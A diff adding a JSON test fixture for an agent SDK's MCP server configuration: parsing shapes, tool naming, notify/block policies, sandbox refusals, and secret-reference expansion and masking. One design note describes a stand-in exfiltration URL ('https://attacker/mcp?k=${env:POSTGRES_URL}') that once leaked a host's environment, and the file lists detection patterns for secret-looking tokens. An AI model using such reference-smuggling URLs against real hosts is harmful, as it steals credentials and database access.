@@ -1,0 +1,1082 @@
+{
+  "about": "The `mcp` entry of an agent file, the same in both SDKs (plan item 0.3, 2026-09-26). `shapes` are the configs a `- mcp: {...}` entry accepts and the server list each resolves to (a server is its name, its transport, and for stdio command/args/env/cwd, for a remote server url/headers; keys a shape does not set are absent). `naming` is the one rule for the name a server's tool gets in the agent. `missing_sdk` is the load-time error when the MCP SDK cannot be loaded. Python: webagents/agents/skills/local/mcp/config.py, tests/agents/skills/test_local_mcp_agent_file.py. TypeScript: src/skills/mcp/config.ts, tests/unit/skills/mcp-agent-file.test.ts.",
+  "naming": {
+    "rule": "Every tool is named <server>__<tool>, always, with two underscores. Not bare-unless-it-collides: a tool's name must not depend on which other servers the file names or on the order they connected in, because access.tools rules and the model's tool calls refer to it, and a rule written today must match the same tool tomorrow. TypeScript always did this; Python used the bare name unless it collided (2026-09-26).",
+    "separator": "__",
+    "cases": [
+      {
+        "server": "sqlite",
+        "tool": "query",
+        "name": "sqlite__query"
+      },
+      {
+        "server": "docs",
+        "tool": "search",
+        "name": "docs__search"
+      },
+      {
+        "server": "fs",
+        "tool": "read_file",
+        "name": "fs__read_file"
+      },
+      {
+        "server": "a",
+        "tool": "b__c",
+        "name": "a__b__c"
+      }
+    ]
+  },
+  "shapes": [
+    {
+      "name": "servers at the top level, stdio",
+      "config": {
+        "sqlite": {
+          "command": "npx",
+          "args": [
+            "-y",
+            "mcp-server-sqlite",
+            "--db",
+            "app.db"
+          ],
+          "env": {
+            "SQLITE_READONLY": "1"
+          }
+        }
+      },
+      "servers": [
+        {
+          "name": "sqlite",
+          "transport": "stdio",
+          "command": "npx",
+          "args": [
+            "-y",
+            "mcp-server-sqlite",
+            "--db",
+            "app.db"
+          ],
+          "env": {
+            "SQLITE_READONLY": "1"
+          }
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "the mcpServers wrapper, as mcp.json files write it",
+      "config": {
+        "mcpServers": {
+          "sqlite": {
+            "command": "uvx",
+            "args": [
+              "mcp-server-sqlite"
+            ]
+          }
+        }
+      },
+      "servers": [
+        {
+          "name": "sqlite",
+          "transport": "stdio",
+          "command": "uvx",
+          "args": [
+            "mcp-server-sqlite"
+          ]
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "stdio with a cwd and no args",
+      "config": {
+        "local": {
+          "command": "./server.sh",
+          "cwd": "tools"
+        }
+      },
+      "servers": [
+        {
+          "name": "local",
+          "transport": "stdio",
+          "command": "./server.sh",
+          "args": [],
+          "cwd": "tools"
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "remote, Streamable HTTP",
+      "config": {
+        "docs": {
+          "url": "https://mcp.example.com/mcp",
+          "transport": "http",
+          "headers": {
+            "Authorization": "Bearer t0k"
+          }
+        }
+      },
+      "servers": [
+        {
+          "name": "docs",
+          "transport": "http",
+          "url": "https://mcp.example.com/mcp",
+          "headers": {
+            "Authorization": "Bearer t0k"
+          }
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "remote, SSE",
+      "config": {
+        "legacy": {
+          "url": "https://mcp.example.com/sse",
+          "transport": "sse"
+        }
+      },
+      "servers": [
+        {
+          "name": "legacy",
+          "transport": "sse",
+          "url": "https://mcp.example.com/sse",
+          "headers": {}
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "remote with no transport named is auto: Streamable HTTP first, then SSE",
+      "config": {
+        "either": {
+          "url": "https://mcp.example.com/"
+        }
+      },
+      "servers": [
+        {
+          "name": "either",
+          "transport": "auto",
+          "url": "https://mcp.example.com/",
+          "headers": {}
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "httpUrl is another spelling of url",
+      "config": {
+        "alias": {
+          "httpUrl": "https://mcp.example.com/mcp"
+        }
+      },
+      "servers": [
+        {
+          "name": "alias",
+          "transport": "auto",
+          "url": "https://mcp.example.com/mcp",
+          "headers": {}
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "mcpUrlTemplate names a remote server whose address is composed at connect time (a hosted shape)",
+      "config": {
+        "hosted": {
+          "mcpUrlTemplate": "https://mcp.example.com/mcp?key={apiKey}",
+          "transport": "http"
+        }
+      },
+      "servers": [
+        {
+          "name": "hosted",
+          "transport": "http",
+          "url": "https://mcp.example.com/mcp?key={apiKey}",
+          "headers": {}
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "several servers keep the file's order",
+      "config": {
+        "b": {
+          "command": "b"
+        },
+        "a": {
+          "url": "https://a.example/mcp"
+        }
+      },
+      "servers": [
+        {
+          "name": "b",
+          "transport": "stdio",
+          "command": "b",
+          "args": []
+        },
+        {
+          "name": "a",
+          "transport": "auto",
+          "url": "https://a.example/mcp",
+          "headers": {}
+        }
+      ],
+      "rejected": []
+    },
+    {
+      "name": "a server with neither command nor url is rejected by name, and the others still load",
+      "config": {
+        "bad": {
+          "args": [
+            "x"
+          ]
+        },
+        "good": {
+          "command": "ok"
+        }
+      },
+      "servers": [
+        {
+          "name": "good",
+          "transport": "stdio",
+          "command": "ok",
+          "args": []
+        }
+      ],
+      "rejected": [
+        {
+          "name": "bad",
+          "reason": "has neither command nor url"
+        }
+      ]
+    },
+    {
+      "name": "an unknown transport is rejected",
+      "config": {
+        "odd": {
+          "url": "https://mcp.example.com/mcp",
+          "transport": "websocket"
+        }
+      },
+      "servers": [],
+      "rejected": [
+        {
+          "name": "odd",
+          "reason": "transport must be http, sse or auto"
+        }
+      ]
+    },
+    {
+      "name": "an entry that is not a mapping is rejected",
+      "config": {
+        "text": "npx server"
+      },
+      "servers": [],
+      "rejected": [
+        {
+          "name": "text",
+          "reason": "is not a mapping"
+        }
+      ]
+    },
+    {
+      "name": "an empty config names no server",
+      "config": {},
+      "servers": [],
+      "rejected": []
+    }
+  ],
+  "tool_policies": {
+    "about": "S-286 (2026-09-26): the `notify` tool policy. TypeScript honours it through a host-provided `policyHook` (programmatic, not an agent-file key): a tool whose policy is `notify` runs only after the hook approves. Python has no approval channel, so rather than run the tool the owner meant to approve without a prompt, it REFUSES a server whose `toolPolicies` names `notify`, by name, at load. `block` (withhold a tool) and `allow` (run it) are honoured/kept in both. This asymmetry is recorded here, like the sandbox fixture's docker_skill waiver; each suite asserts its own side.",
+    "config": {
+      "risky": {
+        "command": "npx",
+        "args": [
+          "srv"
+        ],
+        "toolPolicies": {
+          "delete_all": "notify"
+        }
+      },
+      "safe": {
+        "command": "ok"
+      }
+    },
+    "typescript": {
+      "loads": [
+        "risky",
+        "safe"
+      ],
+      "note": "both load; `risky`'s `notify` tool runs only when the host set a policyHook that approves the call. With NO hook it is REFUSED, not run (`no_hook`, S-286 addendum, 2026-09-26): until then the setting failed open and a bare agent file's notify tool ran without asking."
+    },
+    "python": {
+      "loads": [
+        "safe"
+      ],
+      "rejected": [
+        {
+          "name": "risky",
+          "reason": "the notify tool policy is not supported: this SDK has no approval gate for MCP calls, so use block to withhold a tool or allow to run it"
+        }
+      ]
+    },
+    "no_hook": {
+      "about": "TypeScript (S-286 addendum): the answer a `notify` tool gives when no host hook can ask, with {name} the qualified tool name. Python never registers such a tool (the server is refused at load, above). Read by typescript/tests/unit/skills/mcp-notify-policy-s286-w1fix.test.ts.",
+      "refusal": "Error: {name} needs approval (its policy is notify) and nothing here can ask for it, so it did not run. Use allow to run it or block to withhold it."
+    },
+    "filtering": {
+      "about": "`enabledTools` (the allowlist a hosted platform writes on an entry) and `toolPolicies: block` are applied at discovery in BOTH SDKs (S-286 addendum, 2026-09-26): a tool the server lists that is not in `enabledTools`, or whose policy is `block`, is never registered. TypeScript always did; Python registered every tool a server listed, so a blocked tool stayed callable. Read by typescript/tests/unit/skills/mcp-tool-filtering-s286-e2efix.test.ts and python/tests/agents/skills/test_mcp_tool_filtering_s286_e2efix.py.",
+      "cases": [
+        {
+          "name": "enabledTools keeps only the listed tools, and block removes one of them",
+          "entry": {
+            "command": "srv",
+            "enabledTools": [
+              "a",
+              "b",
+              "c"
+            ],
+            "toolPolicies": {
+              "b": "block"
+            }
+          },
+          "listed": [
+            "a",
+            "b",
+            "c",
+            "d"
+          ],
+          "registered": [
+            "srv__a",
+            "srv__c"
+          ]
+        },
+        {
+          "name": "block alone",
+          "entry": {
+            "command": "srv",
+            "toolPolicies": {
+              "d": "block",
+              "a": "allow"
+            }
+          },
+          "listed": [
+            "a",
+            "b",
+            "c",
+            "d"
+          ],
+          "registered": [
+            "srv__a",
+            "srv__b",
+            "srv__c"
+          ]
+        },
+        {
+          "name": "enabledTools alone",
+          "entry": {
+            "command": "srv",
+            "enabledTools": [
+              "d"
+            ]
+          },
+          "listed": [
+            "a",
+            "b",
+            "c",
+            "d"
+          ],
+          "registered": [
+            "srv__d"
+          ]
+        },
+        {
+          "name": "an empty enabledTools list registers nothing",
+          "entry": {
+            "command": "srv",
+            "enabledTools": []
+          },
+          "listed": [
+            "a",
+            "b"
+          ],
+          "registered": []
+        },
+        {
+          "name": "neither key registers everything",
+          "entry": {
+            "command": "srv"
+          },
+          "listed": [
+            "a",
+            "b"
+          ],
+          "registered": [
+            "srv__a",
+            "srv__b"
+          ]
+        }
+      ]
+    }
+  },
+  "bare_entry": "A bare `- mcp` (no config) reads mcp.json next to the agent file, in either shape above; no file means no servers, and is not an error.",
+  "folder_mcp_json": {
+    "about": "A bare `- mcp` entry resolves the owner's references too (2026-09-27, the final e2e re-run): `${env:NAME}` and `${secret:NAME}` written in the folder's mcp.json are expanded from the owner's environment and keystore exactly as in a `- mcp: {...}` entry, in both loaders (TypeScript skills/resolve.ts, Python cli/agent_builder.py). Python passed no sources for the bare entry, so a reference there was used as its literal bytes. Read by typescript/tests/unit/skills/parity-finalfix.test.ts and python/tests/agents/skills/test_parity_finalfix.py.",
+    "mcp_json": { "mcpServers": { "gh": { "command": "gh-mcp", "env": { "TOKEN": "${env:GH_TOKEN}" } } } },
+    "environment": { "GH_TOKEN": "ghp-fixture-value" },
+    "server": "gh",
+    "resolved_env": { "TOKEN": "ghp-fixture-value" }
+  },
+  "tools": {
+    "about": "The model-facing description of the skill's own tool, the same sentence in both SDKs (2026-09-27; TypeScript src/skills/mcp/skill.ts `listServers` is the reference). Read by the parity tests above.",
+    "list_mcp_servers": { "description": "List connected MCP servers and their available tools, resources, and prompts." }
+  },
+  "missing_sdk": {
+    "starts_with": "The mcp skill needs the MCP SDK, which could not be loaded:",
+    "typescript": "The mcp skill needs the MCP SDK, which could not be loaded: <reason>. Install @modelcontextprotocol/sdk next to webagents (npm install @modelcontextprotocol/sdk).",
+    "python": "The mcp skill needs the MCP SDK, which could not be loaded: <reason>. Install it next to webagents (pip install mcp)."
+  },
+  "sandbox_key": {
+    "about": "S-313 (2026-09-27, the agent-secrets lane): a server entry that asks for a sandbox (`sandbox: true`, or any value but false and null) it cannot get does not start, in both SDKs. Until then Python printed 'Running locally' and started it with the owner's permissions when no Docker `sandbox` skill was loaded, and TypeScript ignored the key with no sign at all. TypeScript has no sandbox for MCP servers, so the key is refused at load, by name, with `refusal.typescript`, and the other servers still load. Python honours it only when the agent also loads the Docker `sandbox` skill (`SandboxSkill`); without that skill the entry is refused when the skill initializes, by name, with `refusal.python`, and `server_report()` lists it as `rejected` like any other refused entry. The refusal is a sentence in the file's own terms, never a run with a different meaning than the file declared (the S-217 shape). Read by typescript/tests/unit/skills/agent-secrets-mcp-sandbox.test.ts and python/tests/agents/skills/test_agent_secrets_mcp_sandbox.py.",
+    "key": "sandbox",
+    "asks_when": "any value except false and null",
+    "refusal": {
+      "typescript": "asks for a sandbox (sandbox: true) that this SDK cannot provide for an MCP server, so it did not start: remove the key to run it with your own permissions",
+      "python": "asks for a sandbox (sandbox: true) that this agent cannot provide, so it did not start: add the sandbox skill (Docker) to the agent, or remove the key to run it with your own permissions"
+    },
+    "config": {
+      "boxed": { "command": "srv", "sandbox": true },
+      "quoted": { "command": "srv", "sandbox": "docker" },
+      "unboxed": { "command": "srv", "sandbox": false },
+      "plain": { "command": "ok" }
+    },
+    "typescript": {
+      "loads": ["unboxed", "plain"],
+      "rejected": ["boxed", "quoted"]
+    },
+    "python": {
+      "without_sandbox_skill": { "loads": ["unboxed", "plain"], "rejected": ["boxed", "quoted"] },
+      "with_sandbox_skill": { "loads": ["boxed", "quoted", "unboxed", "plain"], "rejected": [] }
+    }
+  },
+  "secret_refs": {
+    "about": "`${secret:NAME}` and `${env:NAME}` in an MCP server's env, headers and address (S-292, 2026-09-26), the same in both SDKs: TypeScript src/skills/secrets/references.ts (resolved by src/skills/mcp/skill.ts at connect time, refused and warned about by src/skills/mcp/config.ts at load), Python webagents/agents/skills/local/secrets/references.py (skill.py, config.py). `secret:` reads the keystore `webagents secrets set NAME` writes, for the active profile; `env:` reads the process environment. `$${` is a literal `${`. A reference in command or args is refused at load; nothing on a command line is expanded. `expansion` cases give a value with the secrets and variables in reach and the text it becomes (plus every resolved value, which reports mask) or the sentence the failure says. `hints` pins how the sentence names the CLI command under a profile. `command_line` and `literal_warnings` are normalizer cases (config in, servers/rejected/warnings out). `masking` is what a report shows. `at_connect` is how a failure is composed with the server and field. Read by typescript/tests/unit/skills/mcp-secret-refs-mcpsecrets.test.ts and python/tests/agents/skills/test_mcp_secret_refs_mcpsecrets.py.",
+    "mask": "****",
+    "name_pattern": "^[A-Za-z_][A-Za-z0-9_]{0,127}$",
+    "resolved_in": [
+      "env",
+      "headers",
+      "url",
+      "httpUrl",
+      "mcpUrlTemplate"
+    ],
+    "refused_in": [
+      "command",
+      "args"
+    ],
+    "sentences": {
+      "notClosed": "{text} is not closed: a reference is ${secret:NAME} or ${env:NAME}, and $${ is a literal ${",
+      "unknown": "{text} is not a reference this SDK knows: write ${secret:NAME} or ${env:NAME}, or $${ for a literal ${",
+      "badName": "{text} does not name a secret or a variable: use letters, digits and underscores, not starting with a digit",
+      "secretNotSet": "{text} is not set: store it with `{hint}`",
+      "envNotSet": "{text} is not set in the environment",
+      "commandLine": "puts a reference in {field}, which other local accounts can read from the process list: pass it through env instead",
+      "literal": "has what looks like a secret written into {field} {key}: keep it out of the file with ${secret:{suggested}} and `{hint}`",
+      "atConnect": "{where} of MCP server \"{server}\": {sentence}"
+    },
+    "hints": [
+      {
+        "profile": null,
+        "name": "GH",
+        "hint": "webagents secrets set GH"
+      },
+      {
+        "profile": "local",
+        "name": "GH",
+        "hint": "webagents --profile local secrets set GH"
+      },
+      {
+        "profile": "my test",
+        "name": "GH",
+        "hint": "webagents --profile 'my test' secrets set GH"
+      }
+    ],
+    "expansion": [
+      {
+        "name": "a secret reference in a bearer",
+        "value": "Bearer ${secret:GH}",
+        "secrets": {
+          "GH": "t0k-dummy"
+        },
+        "expected": "Bearer t0k-dummy",
+        "values": [
+          "t0k-dummy"
+        ]
+      },
+      {
+        "name": "an env reference",
+        "value": "${env:DB_HOME}/app.db",
+        "env": {
+          "DB_HOME": "/data"
+        },
+        "expected": "/data/app.db",
+        "values": [
+          "/data"
+        ]
+      },
+      {
+        "name": "$${ is a literal ${",
+        "value": "$${secret:GH}",
+        "expected": "${secret:GH}",
+        "values": []
+      },
+      {
+        "name": "several references in one value",
+        "value": "${env:SCHEME}://${secret:USER}:${secret:PASS}@host",
+        "env": {
+          "SCHEME": "https"
+        },
+        "secrets": {
+          "USER": "u",
+          "PASS": "p"
+        },
+        "expected": "https://u:p@host",
+        "values": [
+          "https",
+          "u",
+          "p"
+        ]
+      },
+      {
+        "name": "no reference passes through, dollars included",
+        "value": "plain $5 and $$ and {x}",
+        "expected": "plain $5 and $$ and {x}",
+        "values": []
+      },
+      {
+        "name": "a secret that is not stored",
+        "value": "${secret:MISSING}",
+        "error": "${secret:MISSING} is not set: store it with `webagents secrets set MISSING`",
+        "missing_secret": "MISSING"
+      },
+      {
+        "name": "an empty secret counts as not stored",
+        "value": "${secret:EMPTY}",
+        "secrets": {
+          "EMPTY": ""
+        },
+        "error": "${secret:EMPTY} is not set: store it with `webagents secrets set EMPTY`",
+        "missing_secret": "EMPTY"
+      },
+      {
+        "name": "a variable that is not set",
+        "value": "${env:NOPE}",
+        "error": "${env:NOPE} is not set in the environment"
+      },
+      {
+        "name": "a scheme this SDK does not know",
+        "value": "x${vault:GH}",
+        "error": "${vault:GH} is not a reference this SDK knows: write ${secret:NAME} or ${env:NAME}, or $${ for a literal ${"
+      },
+      {
+        "name": "a bare name is not a reference",
+        "value": "${GH}",
+        "error": "${GH} is not a reference this SDK knows: write ${secret:NAME} or ${env:NAME}, or $${ for a literal ${"
+      },
+      {
+        "name": "an empty reference",
+        "value": "${}",
+        "error": "${} is not a reference this SDK knows: write ${secret:NAME} or ${env:NAME}, or $${ for a literal ${"
+      },
+      {
+        "name": "a name outside the grammar",
+        "value": "${secret:no-dash}",
+        "error": "${secret:no-dash} does not name a secret or a variable: use letters, digits and underscores, not starting with a digit"
+      },
+      {
+        "name": "a name starting with a digit",
+        "value": "${env:1ABC}",
+        "error": "${env:1ABC} does not name a secret or a variable: use letters, digits and underscores, not starting with a digit"
+      },
+      {
+        "name": "a scheme with no name",
+        "value": "${secret:}",
+        "error": "${secret:} does not name a secret or a variable: use letters, digits and underscores, not starting with a digit"
+      },
+      {
+        "name": "a reference that is not closed",
+        "value": "Bearer ${secret:GH",
+        "error": "${secret:GH is not closed: a reference is ${secret:NAME} or ${env:NAME}, and $${ is a literal ${"
+      },
+      {
+        "name": "a reference that is not closed never echoes what follows it (S-303)",
+        "value": "${secret:GH sk-live-0123456789abcdef",
+        "error": "${secret:GH is not closed: a reference is ${secret:NAME} or ${env:NAME}, and $${ is a literal ${"
+      }
+    ],
+    "command_line": [
+      {
+        "name": "a reference in args is refused by name, and the others still load",
+        "config": {
+          "gh": {
+            "command": "npx",
+            "args": [
+              "-y",
+              "srv",
+              "--token",
+              "${secret:GH}"
+            ]
+          },
+          "ok": {
+            "command": "ok"
+          }
+        },
+        "servers": [
+          {
+            "name": "ok",
+            "transport": "stdio",
+            "command": "ok",
+            "args": []
+          }
+        ],
+        "rejected": [
+          {
+            "name": "gh",
+            "reason": "puts a reference in args, which other local accounts can read from the process list: pass it through env instead"
+          }
+        ]
+      },
+      {
+        "name": "a reference in command is refused",
+        "config": {
+          "gh": {
+            "command": "${env:HOME}/bin/srv"
+          }
+        },
+        "servers": [],
+        "rejected": [
+          {
+            "name": "gh",
+            "reason": "puts a reference in command, which other local accounts can read from the process list: pass it through env instead"
+          }
+        ]
+      },
+      {
+        "name": "an escaped ${ in args is refused too: nothing on a command line is expanded",
+        "config": {
+          "gh": {
+            "command": "srv",
+            "args": [
+              "$${x}"
+            ]
+          }
+        },
+        "servers": [],
+        "rejected": [
+          {
+            "name": "gh",
+            "reason": "puts a reference in args, which other local accounts can read from the process list: pass it through env instead"
+          }
+        ]
+      },
+      {
+        "name": "references in env, headers and url load; they are resolved when the server connects",
+        "config": {
+          "s": {
+            "command": "srv",
+            "env": {
+              "TOKEN": "${secret:GH}"
+            }
+          },
+          "r": {
+            "url": "${env:MCP_BASE}/mcp",
+            "headers": {
+              "Authorization": "Bearer ${secret:GH}"
+            }
+          }
+        },
+        "servers": [
+          {
+            "name": "s",
+            "transport": "stdio",
+            "command": "srv",
+            "args": [],
+            "env": {
+              "TOKEN": "${secret:GH}"
+            }
+          },
+          {
+            "name": "r",
+            "transport": "auto",
+            "url": "${env:MCP_BASE}/mcp",
+            "headers": {
+              "Authorization": "Bearer ${secret:GH}"
+            }
+          }
+        ],
+        "rejected": []
+      }
+    ],
+    "literal_warnings": {
+      "patterns": [
+        "^sk-",
+        "^ghp_",
+        "^github_pat_",
+        "^xox",
+        "^AKIA",
+        "^Bearer\\s+\\S{20,}"
+      ],
+      "suggested_names": [
+        {
+          "server": "ai",
+          "key": "OPENAI_API_KEY",
+          "suggested": "AI_OPENAI_API_KEY"
+        },
+        {
+          "server": "gh",
+          "key": "Authorization",
+          "suggested": "GH_AUTHORIZATION"
+        },
+        {
+          "server": "my-docs",
+          "key": "X-Api-Key",
+          "suggested": "MY_DOCS_X_API_KEY"
+        },
+        {
+          "server": "1st",
+          "key": "k",
+          "suggested": "_1ST_K"
+        }
+      ],
+      "cases": [
+        {
+          "name": "an OpenAI-looking key in env",
+          "config": {
+            "ai": {
+              "command": "srv",
+              "env": {
+                "OPENAI_API_KEY": "sk-abcdefghijklmnopqrstuvwxyz"
+              }
+            }
+          },
+          "warnings": [
+            {
+              "name": "ai",
+              "reason": "has what looks like a secret written into env OPENAI_API_KEY: keep it out of the file with ${secret:AI_OPENAI_API_KEY} and `webagents secrets set AI_OPENAI_API_KEY`"
+            }
+          ]
+        },
+        {
+          "name": "a long bearer in a header",
+          "config": {
+            "gh": {
+              "url": "https://mcp.example.com/mcp",
+              "headers": {
+                "Authorization": "Bearer ghp_0123456789abcdef0123456789abcdef0123"
+              }
+            }
+          },
+          "warnings": [
+            {
+              "name": "gh",
+              "reason": "has what looks like a secret written into headers Authorization: keep it out of the file with ${secret:GH_AUTHORIZATION} and `webagents secrets set GH_AUTHORIZATION`"
+            }
+          ]
+        },
+        {
+          "name": "a Slack token and an AWS key id, one warning each",
+          "config": {
+            "s": {
+              "command": "srv",
+              "env": {
+                "SLACK_TOKEN": "xoxb-1-2-3",
+                "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE"
+              }
+            }
+          },
+          "warnings": [
+            {
+              "name": "s",
+              "reason": "has what looks like a secret written into env SLACK_TOKEN: keep it out of the file with ${secret:S_SLACK_TOKEN} and `webagents secrets set S_SLACK_TOKEN`"
+            },
+            {
+              "name": "s",
+              "reason": "has what looks like a secret written into env AWS_ACCESS_KEY_ID: keep it out of the file with ${secret:S_AWS_ACCESS_KEY_ID} and `webagents secrets set S_AWS_ACCESS_KEY_ID`"
+            }
+          ]
+        },
+        {
+          "name": "a fine-grained GitHub token in a header",
+          "config": {
+            "gh": {
+              "url": "https://mcp.example.com/mcp",
+              "headers": {
+                "X-Token": "github_pat_11ABCDEFG0123456789"
+              }
+            }
+          },
+          "warnings": [
+            {
+              "name": "gh",
+              "reason": "has what looks like a secret written into headers X-Token: keep it out of the file with ${secret:GH_X_TOKEN} and `webagents secrets set GH_X_TOKEN`"
+            }
+          ]
+        },
+        {
+          "name": "a short bearer, a flag and a reference are not literals to warn about",
+          "config": {
+            "x": {
+              "url": "https://a/mcp",
+              "headers": {
+                "Authorization": "Bearer short",
+                "X-Flag": "1"
+              }
+            },
+            "y": {
+              "url": "https://a/mcp",
+              "headers": {
+                "Authorization": "Bearer ${secret:GH_TOKEN_FOR_THIS_SERVER_ONLY}"
+              }
+            },
+            "z": {
+              "command": "srv",
+              "env": {
+                "SQLITE_READONLY": "1"
+              }
+            }
+          },
+          "warnings": []
+        }
+      ]
+    },
+    "masking": {
+      "values": [
+        {
+          "value": "${secret:GH}",
+          "masked": "${secret:GH}"
+        },
+        {
+          "value": "Bearer ${secret:GH}",
+          "masked": "Bearer ${secret:GH}"
+        },
+        {
+          "value": "${env:HOME}/x",
+          "masked": "${env:HOME}/x"
+        },
+        {
+          "value": "ghp_literal0123456789",
+          "masked": "****"
+        },
+        {
+          "value": "1",
+          "masked": "****"
+        },
+        {
+          "value": "${secret:GH",
+          "masked": "****"
+        },
+        {
+          "value": "$${secret:GH}",
+          "masked": "****"
+        },
+        {
+          "value": "sk-live-0123456789abcdef ${secret:GH}",
+          "masked": "**** ${secret:GH}"
+        },
+        {
+          "value": "${secret:GH} ghp_literal0123456789",
+          "masked": "${secret:GH} ****"
+        },
+        {
+          "value": "Token abcdefghijklmnopqrstuvwxyz0123 ${env:X}",
+          "masked": "Token **** ${env:X}"
+        },
+        {
+          "value": "${env:HOME}/x/${secret:K}",
+          "masked": "${env:HOME}/x/${secret:K}"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mcp.example.com/mcp?key=${secret:K}",
+          "masked": "https://mcp.example.com/mcp?key=${secret:K}"
+        },
+        {
+          "url": "https://user:pw@mcp.example.com/mcp?key=abc&x=1#frag",
+          "masked": "https://mcp.example.com/mcp?key=****&x=****#frag"
+        },
+        {
+          "url": "https://mcp.example.com/mcp",
+          "masked": "https://mcp.example.com/mcp"
+        },
+        {
+          "url": "https://mcp.example.com/mcp?flag",
+          "masked": "https://mcp.example.com/mcp?flag"
+        },
+        {
+          "url": "http://127.0.0.1:9/mcp?token=t0k",
+          "masked": "http://127.0.0.1:9/mcp?token=****"
+        },
+        {
+          "url": "https://user:pw@mcp.example.com/mcp?key=${secret:K}&other=literalkey123#f",
+          "masked": "https://mcp.example.com/mcp?key=${secret:K}&other=****#f"
+        },
+        {
+          "url": "https://${secret:USER}:${secret:PW}@mcp.example.com/mcp",
+          "masked": "https://${secret:USER}:${secret:PW}@mcp.example.com/mcp"
+        }
+      ],
+      "text": {
+        "text": "HTTP 401 for token t0k-dummy at https://h/?k=t0k-dummy (u)",
+        "values": [
+          "t0k-dummy",
+          "",
+          "u"
+        ],
+        "masked": "HTTP 401 for token **** at https://h/?k=**** (****)"
+      },
+      "_s303_comment": "S-303 (2026-09-26): a literal beside a reference is masked (every whitespace-delimited token that looks like a secret or is 16 or more characters), a reference stays as written, and an address with a reference still loses its user:password@ and its literal query values."
+    },
+    "at_connect": [
+      {
+        "server": "docs",
+        "field": "headers",
+        "key": "Authorization",
+        "sentence": "${secret:GH} is not set: store it with `webagents secrets set GH`",
+        "composed": "headers Authorization of MCP server \"docs\": ${secret:GH} is not set: store it with `webagents secrets set GH`"
+      },
+      {
+        "server": "docs",
+        "field": "url",
+        "key": null,
+        "sentence": "${env:HOST} is not set in the environment",
+        "composed": "url of MCP server \"docs\": ${env:HOST} is not set in the environment"
+      }
+    ],
+    "resolution_gate": {
+      "about": "S-295 (CRITICAL, 2026-09-26): resolution is OFF unless the skill is built with `references` (TypeScript `MCPSkillConfig.references`, Python config key `references`): the env mapping and the secret reader are INJECTED by the builder, never hard-wired to the process environment or the CLI keystore. Only the agent-file loaders pass them (TypeScript `skills/resolve.ts` `mcp`, Python `cli/agent_builder.py` and `cli/daemon/manager.py`, through `ownerReferenceSources()` / `owner_reference_sources()`), for a file the local owner wrote and runs. A host that builds the skill from data its users saved passes nothing, and a `${...}` in ANY field is used as the literal bytes written: the portal had expanded `https://attacker/mcp?k=${env:POSTGRES_URL}` from its own environment and sent the value to that server. The loader's warnings and refusals (`command_line`, `literal_warnings`) are load-time and hold either way. Read by typescript/tests/unit/skills/mcp-reference-gate-s295-e2efix.test.ts and python/tests/agents/skills/test_mcp_reference_gate_s295_e2efix.py.",
+      "config_key": "references",
+      "sources": [
+        "env",
+        "secret"
+      ],
+      "variable": "PROBE_GATE_VAR",
+      "variable_value": "value-from-the-host-environment",
+      "literal_cases": [
+        {
+          "field": "url",
+          "value": "https://mcp.example.test/mcp?k=${env:PROBE_GATE_VAR}"
+        },
+        {
+          "field": "httpUrl",
+          "value": "https://mcp.example.test/mcp?k=${env:PROBE_GATE_VAR}"
+        },
+        {
+          "field": "mcpUrlTemplate",
+          "value": "https://mcp.example.test/mcp?k=${env:PROBE_GATE_VAR}&a={apiKey}"
+        },
+        {
+          "field": "headers",
+          "key": "Authorization",
+          "value": "Bearer ${env:PROBE_GATE_VAR}"
+        },
+        {
+          "field": "headers",
+          "key": "X-Secret",
+          "value": "${secret:PROBE_TOKEN}"
+        },
+        {
+          "field": "env",
+          "key": "TOKEN",
+          "value": "${secret:PROBE_TOKEN}"
+        },
+        {
+          "field": "env",
+          "key": "COPIED",
+          "value": "${env:PROBE_GATE_VAR}"
+        }
+      ],
+      "resolved_header": {
+        "key": "Authorization",
+        "value": "Bearer ${env:PROBE_GATE_VAR}",
+        "expected": "Bearer value-from-the-host-environment"
+      }
+    },
+    "problem_lines": {
+      "about": "What a CLI says on stderr about a server that did not load or connect, or carries a literal that looks like a key (2026-09-26, the e2e run: the Python `-p` was silent about MCP problems while the TypeScript CLI said them). The TypeScript skill prints them itself at load and connect (`mcpProblemLine`); the Python `-p` prints them from the skill's `server_report()` after the agent is built (`problem_lines`), the Python chat logs them to its file, and `doctor` prints none of them in either SDK: its `mcp` check carries the same findings and nothing may sit above the report. Read by typescript/tests/unit/skills/mcp-problem-lines-e2efix.test.ts and python/tests/cli/test_prompt_mcp_problems_e2efix.py.",
+      "failed": "[MCPSkill] Server \"{name}\" failed to connect: {error}",
+      "rejected": "[MCPSkill] Server \"{name}\" {reason}; skipping it.",
+      "warning": "[MCPSkill] Server \"{name}\" {warning}",
+      "cases": [
+        {
+          "name": "a failed connection",
+          "report": [
+            {
+              "name": "ghost",
+              "transport": "stdio",
+              "connected": false,
+              "tools": [],
+              "error": "spawn /nonexistent/mcp-server ENOENT",
+              "missing_secrets": [],
+              "warnings": []
+            }
+          ],
+          "lines": [
+            "[MCPSkill] Server \"ghost\" failed to connect: spawn /nonexistent/mcp-server ENOENT"
+          ]
+        },
+        {
+          "name": "a rejected entry",
+          "report": [
+            {
+              "name": "bad",
+              "transport": "unknown",
+              "connected": false,
+              "tools": [],
+              "rejected": "has neither command nor url",
+              "missing_secrets": [],
+              "warnings": []
+            }
+          ],
+          "lines": [
+            "[MCPSkill] Server \"bad\" has neither command nor url; skipping it."
+          ]
+        },
+        {
+          "name": "a literal that looks like a key, on a server that connected",
+          "report": [
+            {
+              "name": "gh",
+              "transport": "http",
+              "connected": true,
+              "tools": [],
+              "missing_secrets": [],
+              "warnings": [
+                "has what looks like a secret written into headers Authorization: keep it out of the file with ${secret:GH_AUTHORIZATION} and `webagents secrets set GH_AUTHORIZATION`"
+              ]
+            }
+          ],
+          "lines": [
+            "[MCPSkill] Server \"gh\" has what looks like a secret written into headers Authorization: keep it out of the file with ${secret:GH_AUTHORIZATION} and `webagents secrets set GH_AUTHORIZATION`"
+          ]
+        },
+        {
+          "name": "nothing to say",
+          "report": [
+            {
+              "name": "ok",
